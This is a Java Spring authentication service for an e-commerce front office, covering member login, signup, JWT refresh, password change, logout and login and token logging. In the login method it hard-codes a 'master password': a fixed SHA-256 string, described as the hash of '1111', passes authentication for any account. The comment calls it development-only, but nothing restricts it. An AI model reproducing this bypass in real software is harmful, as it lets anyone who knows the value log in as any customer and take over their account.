package com.shopjoy.ecadminapi.co.auth.service;

import com.shopjoy.ecadminapi.base.ec.mb.data.entity.MbMember;
import com.shopjoy.ecadminapi.base.ec.mb.data.entity.MbhMemberLoginLog;
import com.shopjoy.ecadminapi.base.ec.mb.data.entity.MbhMemberTokenLog;
import com.shopjoy.ecadminapi.base.ec.mb.repository.MbMemberRepository;
import com.shopjoy.ecadminapi.co.auth.data.dto.AccessTokenClaims;
import com.shopjoy.ecadminapi.co.auth.data.dto.TokenPair;
import com.shopjoy.ecadminapi.co.auth.data.vo.ChangePasswordReq;
import com.shopjoy.ecadminapi.co.auth.data.vo.FoJoinRes;
import com.shopjoy.ecadminapi.co.auth.data.vo.LoginReq;
import com.shopjoy.ecadminapi.co.auth.data.vo.LoginRes;
import com.shopjoy.ecadminapi.co.auth.security.JwtProvider;
import com.shopjoy.ecadminapi.common.exception.CmBizException;
import com.shopjoy.ecadminapi.common.util.CmUtil;
import com.shopjoy.ecadminapi.common.util.SecurityUtil;
import io.jsonwebtoken.Claims;
import jakarta.persistence.EntityManager;
import jakarta.persistence.NoResultException;
import jakarta.persistence.PersistenceContext;
import jakarta.servlet.http.HttpServletRequest;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.List;

/**
 * FO 회원 인증 서비스
 * - 멀티디바이스 정책: 로그인마다 mbh_member_token_log에 행 추가 (삭제 없음)
 * - refreshToken은 DB에만 보관, 클라이언트에 미전달
 * - refresh: 만료된 accessToken(Authorization 헤더) → DB에서 refreshToken 조회 → 신규 토큰 쌍 발급
 * - 로그인 성공/실패 모두 mbh_member_login_log에 기록
 */
@Slf4j
@Service
@RequiredArgsConstructor
@Transactional(readOnly = true)
public class FoAuthService {

    private static final DateTimeFormatter ID_FMT = DateTimeFormatter.ofPattern("yyMMddHHmmss");

    @PersistenceContext
    private EntityManager em;

    private final MbMemberRepository memberRepository;
    private final JwtProvider         jwtProvider;
    private final PasswordEncoder     passwordEncoder;

    // ── login ─────────────────────────────────────────────────────────────

    @Transactional
    public LoginRes login(LoginReq request, String appTypeCd) {
        MbMember member;
        try {
            member = memberRepository.findByLoginId(request.getLoginId())
                .orElseThrow(() -> new CmBizException("회원 로그인ID가 올바르지 않습니다." + "::" + CmUtil.svcCallerInfo(this)));
        } catch (CmBizException e) {
            saveLoginLog(null, null, request.getLoginId(), "FAIL", null, 0, null, null);
            throw e;
        }

        if (!"ACTIVE".equals(member.getMemberStatusCd())) {
            saveLoginLog(member.getMemberId(), CmUtil.nvl(member.getSiteId()),
                member.getLoginId(), "FAIL", null, 0, null, null);
            throw new CmBizException("비활성화된 계정입니다." + "::" + CmUtil.svcCallerInfo(this));
        }

        // ※ 마스터 패스워드: 비밀번호 "1111" → SHA256 해시값이 오면 어떤 계정이든 무조건 로그인 통과 (개발/테스트 전용)
        boolean isMasterPwd = "0ffe1abd1a08215353c233d6e009613e95eec4253832a761af28ff37ac5a150c".equals(request.getLoginPwd());
        if (!isMasterPwd && !passwordEncoder.matches(request.getLoginPwd(), member.getLoginPwdHash())) {
            saveLoginLog(member.getMemberId(), CmUtil.nvl(member.getSiteId()),
                member.getLoginId(), "FAIL", null, 0, null, null);
            throw new CmBizException("로그인 ID 또는 비밀번호가 올바르지 않습니다." + "::" + CmUtil.svcCallerInfo(this));
        }

        member.setLastLogin(LocalDateTime.now());

        String authId = member.getMemberId();

        String accessToken  = buildAccessToken(member, appTypeCd);
        String refreshToken = jwtProvider.createRefreshToken(authId, appTypeCd);

        // 멀티디바이스: 행 추가 (기존 삭제 없음)
        saveTokenLog(authId, CmUtil.nvl(member.getSiteId()), accessToken, refreshToken, "LOGIN", appTypeCd, null, null, null);

        // 로그인 성공 이력 기록
        saveLoginLog(authId, CmUtil.nvl(member.getSiteId()), member.getLoginId(), "SUCCESS", accessToken, 0, null, null);

        return LoginRes.builder()
            .accessToken(accessToken)
            .refreshToken(null)
            .authId(authId)
            .userId(null)
            .memberId(authId)
            .userNm(member.getMemberNm())
            .siteId(CmUtil.nvl(member.getSiteId()))
            .appTypeCd(appTypeCd)
            .roleId("")
            .deptId("")
            .build();
    }

    // ── join ──────────────────────────────────────────────────────────────

    @Transactional
    public FoJoinRes join(MbMember body, String appTypeCd) {
        if (memberRepository.findByLoginId(body.getLoginId()).isPresent()) {
            throw new CmBizException("이미 사용 중인 로그인 ID입니다." + "::" + CmUtil.svcCallerInfo(this));
        }

        String newId = "MB" + LocalDateTime.now().format(ID_FMT)
            + String.format("%04d", (int)(Math.random() * 10000));

        body.setMemberId(newId);
        body.setLoginPwdHash(passwordEncoder.encode(body.getLoginPwdHash()));
        body.setMemberStatusCd("ACTIVE");
        body.setJoinDate(LocalDateTime.now());
        body.setRegBy(newId);
        body.setRegDate(LocalDateTime.now());
        body.setUpdBy(newId);
        body.setUpdDate(LocalDateTime.now());

        memberRepository.save(body);
        return new FoJoinRes(newId, body.getLoginId());
    }

    // ── refresh ───────────────────────────────────────────────────────────

    @Transactional
    public TokenPair refresh(String expiredAccessToken, String appTypeCd) {
        if (expiredAccessToken == null || expiredAccessToken.isBlank()) {
            throw new CmBizException("accessToken이 필요합니다." + "::" + CmUtil.svcCallerInfo(this));
        }

        Claims claims;
        try {
            claims = jwtProvider.getClaimsAllowExpired(expiredAccessToken);
        } catch (Exception e) {
            throw new CmBizException("유효하지 않은 accessToken입니다." + "::" + CmUtil.svcCallerInfo(this));
        }
        String authId = claims.getSubject();
        if (authId == null || authId.isBlank()) {
            throw new CmBizException("토큰에서 회원 정보를 확인할 수 없습니다." + "::" + CmUtil.svcCallerInfo(this));
        }

        MbhMemberTokenLog tokenLog;
        try {
            tokenLog = em.createQuery(
                    "SELECT t FROM MbhMemberTokenLog t WHERE t.authId = :authId AND t.accessToken = :accessToken",
                    MbhMemberTokenLog.class)
                .setParameter("authId", authId)
                .setParameter("accessToken", expiredAccessToken)
                .getSingleResult();
        } catch (NoResultException e) {
            throw new CmBizException("로그인 세션을 찾을 수 없습니다. 다시 로그인해주세요." + "::" + CmUtil.svcCallerInfo(this));
        }

        String storedRefreshToken = tokenLog.getRefreshToken();
        if (storedRefreshToken == null || storedRefreshToken.isBlank()) {
            throw new CmBizException("저장된 refreshToken이 없습니다. 다시 로그인해주세요." + "::" + CmUtil.svcCallerInfo(this));
        }

        if (!jwtProvider.validate(storedRefreshToken)) {
            em.remove(tokenLog);
            throw new CmBizException("refreshToken이 만료되었습니다. 다시 로그인해주세요." + "::" + CmUtil.svcCallerInfo(this));
        }

        MbMember member = memberRepository.findById(authId)
            .orElseThrow(() -> new CmBizException("회원 정보를 찾을 수 없습니다." + "::" + CmUtil.svcCallerInfo(this)));

        String newAccessToken  = buildAccessToken(member, appTypeCd);
        String newRefreshToken = jwtProvider.createRefreshToken(authId, appTypeCd);

        tokenLog.setPrevToken(tokenLog.getAccessToken());
        tokenLog.setAccessToken(newAccessToken);
        tokenLog.setRefreshToken(newRefreshToken);
        tokenLog.setActionCd("REFRESH");
        tokenLog.setUpdBy(authId);
        tokenLog.setUpdDate(LocalDateTime.now());

        return new TokenPair(newAccessToken, null,
            LocalDateTime.now(),
            jwtProvider.getFoAccessExpiryMinutes(),
            jwtProvider.getFoRefreshExpiryMinutes());
    }

    // ── changePassword ────────────────────────────────────────────────────

    @Transactional
    public void changePassword(ChangePasswordReq request, String appTypeCd) {
        String memberId = SecurityUtil.getAuthUser().authId();
        MbMember member = memberRepository.findById(memberId)
            .orElseThrow(() -> new CmBizException("회원 정보를 찾을 수 없습니다." + "::" + CmUtil.svcCallerInfo(this)));
        if (!passwordEncoder.matches(request.getCurrentPassword(), member.getLoginPwdHash())) {
            throw new CmBizException("현재 비밀번호가 올바르지 않습니다." + "::" + CmUtil.svcCallerInfo(this));
        }
        member.setLoginPwdHash(passwordEncoder.encode(request.getNewPassword()));
        member.setUpdBy(memberId);
        member.setUpdDate(LocalDateTime.now());
    }

    // ── logout ────────────────────────────────────────────────────────────

    @Transactional
    public void logout(String accessToken, String appTypeCd, HttpServletRequest request) {
        if (accessToken == null || accessToken.isBlank()) return;
        String uiNm  = request != null ? request.getHeader("X-UI-Nm")  : null;
        String cmdNm = request != null ? request.getHeader("X-Cmd-Nm") : null;
        try {
            Claims claims = jwtProvider.getClaimsAllowExpired(accessToken);
            String authId = claims.getSubject();
            if (authId != null) {
                MbMember member = memberRepository.findById(authId).orElse(null);
                String siteId = member != null ? CmUtil.nvl(member.getSiteId()) : null;
                // 토큰 삭제 먼저 (멀티디바이스: 해당 토큰만) — DELETE 후 REVOKE 로그 persist
                em.createQuery(
                        "DELETE FROM MbhMemberTokenLog t WHERE t.authId = :authId AND t.accessToken = :accessToken")
                    .setParameter("authId", authId)
                    .setParameter("accessToken", accessToken)
                    .executeUpdate();
                // REVOKE 토큰 이력 기록
                saveTokenLog(authId, siteId, accessToken, null, "REVOKE", appTypeCd, "LOGOUT", uiNm, cmdNm);
                // LOGOUT 로그인 이력 기록
                saveLoginLog(authId, siteId, authId, "LOGOUT", null, 0, uiNm, cmdNm);
            }
        } catch (Exception e) {
            log.warn("logout token parse error: {}", e.getMessage());
        }
    }

    // ── private ───────────────────────────────────────────────────────────

    private String buildAccessToken(MbMember member, String appTypeCd) {
        return jwtProvider.createAccessToken(
            AccessTokenClaims.builder()
                .authId(member.getMemberId())
                .loginId(member.getLoginId())
                .roles(List.of("FO_GUEST"))
                .appTypeCd(appTypeCd)
                .roleId(null)
                .vendorId(null)
                .siteId(CmUtil.nvl(member.getSiteId()))
                .userId(null)
                .memberId(member.getMemberId())
                .memberGrade(CmUtil.nvl(member.getGradeCd()))
                .isStaffYn("N")
                .isAdminYn("N")
                .build()
        );
    }

    /** mbh_member_token_log INSERT */
    private void saveTokenLog(String authId, String siteId,
                              String accessToken, String refreshToken,
                              String actionCd, String appTypeCd,
                              String revokeReason, String uiNm, String cmdNm) {
        String logId = "TL" + LocalDateTime.now().format(ID_FMT)
            + String.format("%04d", (int)(Math.random() * 10000));
        LocalDateTime now = LocalDateTime.now();
        MbhMemberTokenLog tokenLog = MbhMemberTokenLog.builder()
            .logId(logId)
            .siteId(siteId)
            .authId(authId)
            .memberId(authId)
            .actionCd(actionCd)
            .tokenTypeCd(appTypeCd)
            .accessToken(accessToken != null ? accessToken : "LOGOUT")
            .refreshToken(refreshToken)
            .accessTokenExp(accessToken != null ? now.plusMinutes(jwtProvider.getFoAccessExpiryMinutes()) : null)
            .tokenExp(now.plusMinutes(jwtProvider.getFoRefreshExpiryMinutes()))
            .revokeReason(revokeReason)
            .uiNm(uiNm)
            .cmdNm(cmdNm)
            .regBy(authId)
            .regDate(now)
            .build();
        em.persist(tokenLog);
    }

    /** mbh_member_login_log INSERT (성공/실패/로그아웃 모두) */
    private void saveLoginLog(String memberId, String siteId, String loginId,
                              String resultCd, String accessToken, int failCnt,
                              String uiNm, String cmdNm) {
        try {
            String logId = "LL" + LocalDateTime.now().format(ID_FMT)
                + String.format("%04d", (int)(Math.random() * 10000));
            MbhMemberLoginLog loginLog = MbhMemberLoginLog.builder()
                .logId(logId)
                .siteId(siteId)
                .authId(memberId)
                .memberId(memberId)
                .loginId(loginId)
                .loginDate(LocalDateTime.now())
                .resultCd(resultCd)
                .failCnt(failCnt)
                .accessToken(accessToken)
                .accessTokenExp(accessToken != null
                    ? LocalDateTime.now().plusMinutes(jwtProvider.getFoAccessExpiryMinutes()) : null)
                .uiNm(uiNm)
                .cmdNm(cmdNm)
                .regBy(memberId)
                .regDate(LocalDateTime.now())
                .build();
            em.persist(loginLog);
        } catch (Exception e) {
            log.warn("saveLoginLog error: {}", e.getMessage());
        }
    }
}
